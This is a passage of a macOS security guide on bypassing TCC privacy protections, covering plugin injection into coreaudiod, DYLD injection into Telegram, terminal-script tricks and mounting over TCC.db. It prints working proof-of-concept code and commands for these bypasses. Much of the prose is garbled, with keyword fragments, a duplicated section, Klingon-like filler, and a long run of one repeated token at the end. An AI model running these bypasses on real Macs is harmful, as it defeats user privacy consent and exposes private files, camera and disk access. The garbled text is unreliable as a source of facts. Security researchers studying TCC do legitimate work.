**possible** **run** **`configd`** **`-t`** **option**, **attacker** **specify** **custom Bundle** **load**. **exploit** **replaces** **`dsexport`** **`dsimport`** **method** **changing** **user’s home directory** **`configd` code injection**.

**info** [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## By process injection

**different techniques** **inject code** **process** **abuse** **TCC privileges**:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

**common process injection** **bypass TCC** **via plugins (load library)**.\
**Plugins** **extra code** **form** **libraries** **plist**, **loaded** **main application** **execute** **context**. **main application** **access** **TCC restricted files** (**granted permissions** **entitlements**), **custom code** **also have it**.

### CVE-2020-27937 - Directory Utility

**application** `/System/Library/CoreServices/Applications/Directory Utility.app` **entitlement** **`kTCCServiceSystemPolicySysAdminFiles`**, **loaded plugins** **`.daplug`** **extension** **hardened** **runtime**.

**weaponize** **CVE**, **`NFSHomeDirectory`** **changed** (abusing **previous entitlement**) **able** **take over** **users TCC database** **bypass TCC**.

**info** [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
### CVE-2020-29621 - Coreaudiod

The binary **`/usr/sbin/coreaudiod`** had the entitlements `com.apple.security.cs.disable-library-validation` and `com.apple.private.tcc.manager`. The first **allowing code injection** and second one giving it access to **manage TCC**.

This binary allowed to load **third party plug-ins** from the folder `/Library/Audio/Plug-Ins/HAL`. Therefore, it was possible to **load a plugin and abuse the TCC permissions** with this PoC:

### CVE-2020-29621 - Coreaudiod

The binary **`/usr/sbin/coreaudiod`** had the entitlements `com.apple.security.cs.disable-library-validation` and `com.apple.private.tcc.manager`. The first **allowing code injection** and second one giving it access to **manage TCC**.

This binary allowed to load **third party plug-ins** from the folder `/Library/Audio/Plug-Ins/HAL`. Therefore, it was possible to **load a plugin and abuse the TCC permissions** with this PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
### Device Abstraction Layer (DAL) Plug-Ins

System applications that open camera stream via Core Media I/O (apps with **`kTCCServiceCamera`**) load **in the process these plugins** located in `/Library/CoreMediaIO/Plug-Ins/DAL` (not SIP restricted).

Just storing in there a library with the common **constructor** will work to **inject code**.

Several Apple applications were vulnerable to this.

### Firefox

The Firefox application had the `com.apple.security.cs.disable-library-validation` and `com.apple.security.cs.allow-dyld-environment-variables` entitlements:

### Original Report

For more info check the [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
### CVE-2020-10006

The binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` had the entitlements **`com.apple.private.tcc.allow`** and **`com.apple.security.get-task-allow`**, which allowed to inject code inside the process and use the TCC privileges.

### CVE-2023-26818 - Telegram

Telegram had the entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** and **`com.apple.security.cs.disable-library-validation`**, so it was possible to abuse it to **get access to its permissions** such recording with the camera. You can [**find the payload in the writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Note how to use the env variable to load a library a **custom plist** was created to inject this library and **`launchctl`** was used to launch it:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## By open invocations

**`open`** jatlhlaHchugh **`open`** vItlhutlh

### Terminal Scripts

**Full Disk Access (FDA)** jatlhlaHchugh terminal **ghItlh** laH. 'ach **`.terminal`** scripts **`CommandString`** key **ghItlh** **`CommandString`** **`open`** vItlhutlh.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
# README.md

## macOS TCC Bypasses

An application could write a terminal script in a location such as `/tmp` and launch it with a command such as:

```bash
osascript -e 'do shell script "/tmp/script.sh"'
```

This bypasses the macOS Transparency, Consent, and Control (TCC) framework, which is responsible for managing user privacy preferences and permissions.

To execute this bypass, the application needs to have the necessary permissions to write the script file to the desired location, such as `/tmp`. Additionally, the application needs to have the necessary permissions to execute the `osascript` command.

Keep in mind that this bypass may not work if the user has explicitly denied the application's permissions or if the application is running in a sandboxed environment with restricted privileges.

It is important to note that bypassing the TCC framework may be considered a violation of user privacy and can potentially lead to security vulnerabilities. Therefore, it is recommended to follow proper security practices and obtain necessary permissions from the user through legitimate means.
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount\_apfs TCC bypass and privilege escalation

**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

**Qapla'!**

**[**ghItlh'a'**](https://theevilbit.github.io/posts/cve\_2020\_9771/) **tlhIngan Hol vItlhutlhlaHbe'chugh.**

### CVE-2021-1784 & CVE-2021-30808 - TCC file qach

TCC DB file qach, **tugh** **qach** **tugh** **TCC.db** **file** **mount** **'e'** **'e'**:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**full exploit** **'ej** [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) **vItlhutlh**.

### asr

**`/usr/sbin/asr`** **DIvI' 'ej DISmey 'ej 'oH 'e' vItlhutlh TCC protections.

### Location Services

**`/var/db/locationd/clients.plist`** **Hoch 'ej location services** **ghap vItlhutlh** TCC database.\
**`/var/db/locationd/`** **DMG mounting** **ghap vItlhutlh** **tlhutlh** **vItlhutlh** plist.

## By startup apps

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## By grep

**'ej** Apple **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vIt
